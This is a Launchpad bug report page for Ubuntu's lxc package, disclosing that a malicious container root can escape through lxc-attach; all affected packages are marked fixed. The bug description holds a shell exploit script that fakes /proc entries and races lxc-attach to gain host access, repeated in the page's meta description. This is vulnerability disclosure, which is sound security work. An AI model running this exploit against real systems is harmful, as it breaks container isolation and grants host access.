<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1639345 “lxc-attach to malicious container allows access to...” : Bugs : lxc package : Ubuntu</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1639345" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1639345/bug.atom" title="Bug 1639345 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.

In guest sequence:

cat &lt;&lt;EOF &gt; /tmp/test
#!/bin/bash -e
rm -rf /test || true
mkdir -p /test/sys/kernel
echo &quot;proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0&quot; &gt; /test/mounts
echo 0 &gt; /test/sys/kernel/cap_last_cap
mkdir -p ..." />
      <meta property="og:description" content="A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.

In guest sequence:

cat &lt;&lt;EOF &gt; /tmp/test
#!/bin/bash -e
rm -rf /test || true
mkdir -p /test/sys/kernel
echo &quot;proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0&quot; &gt; /test/mounts
echo 0 &gt; /test/sys/kernel/cap_last_cap
mkdir -p ..." />
    

    
    
      <meta property="og:title" content="Bug #1639345 “lxc-attach to malicious container allows access to...” : Bugs : lxc package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1639345" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/lxc">lxc package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/lxc">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/lxc">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/lxc">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/lxc">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    lxc-attach to malicious container allows access to host
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1639345 reported by
      <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler</a>
      <time title="2016-11-04 20:30:53 UTC" datetime="2016-11-04T20:30:53.202371+00:00">on 2016-11-04</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">266</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr id="tasksummary2162306">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2162306">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/linux" title="Latest release: 5.11.0-40.44, uploaded to main on 2021-10-20 14:31:33.255814+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)">linux (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162306">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162688">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/linux">Trusty</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/linux/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/linux/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162688">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162695">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/linux">Vivid</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/linux/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/linux/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162695">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162691">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/linux">Xenial</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/linux/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/linux/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162691">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162693">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/linux">Yakkety</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/linux/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/linux/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162693">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr class="highlight" id="tasksummary2160638">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2160638">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/lxc" title="Latest release: 1:4.0.10-0ubuntu5, uploaded to universe on 2021-09-24 14:31:08.843633+00:00 by Lukas Märdian (slyon), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">lxc (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2160638">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~cbrauner">Christian Brauner</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162689">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/lxc">Trusty</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/lxc/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/lxc/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162689">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162696">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/lxc">Vivid</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/lxc/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/vivid/+source/lxc/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162696">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162692">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/lxc">Xenial</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/lxc/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/lxc/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162692">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    
  


        
        
          
  <tr id="tasksummary2162694">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/lxc">Yakkety</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/lxc/+bug/1639345/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/yakkety/+source/lxc/+bug/1639345/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2162694">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.</p>
<p>In guest sequence:</p>
<p>cat &lt;&lt;EOF &gt; /tmp/test<br />
#!/bin/bash -e<br />
rm -rf /test || true<br />
mkdir -p /test/sys/kernel<br />
echo &quot;proc /proc proc rw,nosuid,<wbr />nodev,noexec,<wbr />relatime 0 0&quot; &gt; /test/mounts<br />
echo 0 &gt; /test/sys/<wbr />kernel/<wbr />cap_last_<wbr />cap<br />
mkdir -p /test/self<br />
mknod /test/self/status p<br />
cd /proc<br />
mount -o bind /test /proc<br />
while true; do<br />
&nbsp;&nbsp;pid=\$(ls -al */exe | grep lxc-attach | sed -r -e &#x27;s/.* ([0-9]+)\\/exe -&gt;.*/\\1/&#x27;)<br />
&nbsp;&nbsp;if [ &quot;\${pid}&quot; != &quot;&quot; ]; then<br />
&nbsp;&nbsp;&nbsp;&nbsp;cd /<br />
&nbsp;&nbsp;&nbsp;&nbsp;umount -i -f -l -n /proc<br />
&nbsp;&nbsp;&nbsp;&nbsp;exec /LxcAttachEscape &quot;\${pid}&quot; /bin/bash<br />
&nbsp;&nbsp;fi<br />
&nbsp;&nbsp;sleep 1<br />
done<br />
EOF</p>
<p>See attachment for LxcAttachEscape.c</p>
<p>Exploit uses fixed fd=7 for attacking, on other test environment, it might be other fd. Tests were performed by attacking lxc-attach started by</p>
<p>screen lxc-attach -n [guestname]</p>
<p>which is the sequence required against the TTY-stealing attacks also not fixed in all lxc-attach versions.</p>
<p>In my opinion two bugs might need fixing:<br />
* lxc-attach should not use untrusted/<wbr />manipulated information for proceeding<br />
* kernel should prevent against ptracing of lxc-attach as it was created in another USERNS</p>
<p># lsb_release -r -d<br />
Description:    Ubuntu 16.04.1 LTS<br />
Release:        16.04</p>
<p># apt-cache policy lxc1<br />
lxc1:<br />
&nbsp;&nbsp;Installed: 2.0.5-0ubuntu1~<wbr />ubuntu16.<wbr />04.2<br />
&nbsp;&nbsp;Candidate: 2.0.5-0ubuntu1~<wbr />ubuntu16.<wbr />04.2<br />
&nbsp;&nbsp;Version table:<br />
&nbsp;*** 2.0.5-0ubuntu1~<wbr />ubuntu16.<wbr />04.2 500<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 <a rel="nofollow" href="http://debarchive-ehealth.d03.arc.local/ubuntu">http://<wbr />debarchive-<wbr />ehealth.<wbr />d03.arc.<wbr />local/ubuntu</a> xenial-updates/main amd64 Packages<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100 /var/lib/<wbr />dpkg/status<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.0.0-0ubuntu2 500<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 <a rel="nofollow" href="http://debarchive-ehealth.d03.arc.local/ubuntu">http://<wbr />debarchive-<wbr />ehealth.<wbr />d03.arc.<wbr />local/ubuntu</a> xenial/main amd64 Packages</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="official-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=verification-done-xenial">verification-done-xenial</a>
            <a class="unofficial-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=bot-stop-nagging">bot-stop-nagging</a>
            <a class="unofficial-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=kernel-da-key">kernel-da-key</a>
            <a class="unofficial-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=verification-done-trusty">verification-done-trusty</a>
            <a class="unofficial-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=verification-done-vivid">verification-done-vivid</a>
            <a class="unofficial-tag" href="/ubuntu/+source/lxc/+bugs?field.tag=verification-done-yakkety">verification-done-yakkety</a>
          </span>
          
